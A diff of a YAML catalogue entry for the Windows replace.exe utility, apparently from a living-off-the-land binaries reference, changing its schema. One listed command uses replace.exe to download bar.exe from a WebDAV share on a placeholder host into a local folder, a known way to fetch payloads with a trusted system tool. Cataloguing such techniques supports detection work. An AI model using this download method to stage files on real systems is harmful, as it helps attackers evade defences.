@@ -1,21 +1,18 @@
 ---
-Name: Replace.exe
-Description: Copy, Download
-Author: ''
-Created: '2018-05-25'
-Categories: []
-Commands:
-  - Command: replace.exe C:\Source\File.cab C:\Destination /A
-    Description: Copy the specified file to the destination folder.
-  - Command: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
-    Description: Copy the specified file to the destination folder.
-Full Path:
-  - C:\Windows\System32\replace.exe
-  - C:\Windows\SysWOW64\replace.exe
-Code Sample: []
-Detection: []
-Resources:
-  - https://twitter.com/elceef/status/986334113941655553
-  - https://twitter.com/elceef/status/986842299861782529
-Notes: Thanks to elceef - @elceef
-
+name: replace.exe
+description: 
+functions:
+  copy:
+    - description: Copy the specified file to the destination folder.
+      code: replace.exe C:\Source\File.cab C:\Destination /A
+  download:
+    - description: Copy the specified file to the destination folder.
+      code: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
+resources: 
+    - resource: https://twitter.com/elceef/status/986334113941655553
+    - resource: https://twitter.com/elceef/status/986842299861782529
+fullpath: 
+    - path: c:\windows\system32\replace.exe
+    - path: c:\windows\sysWOW64\replace.exe
+notes: Thanks to elceef - @elceef
+---
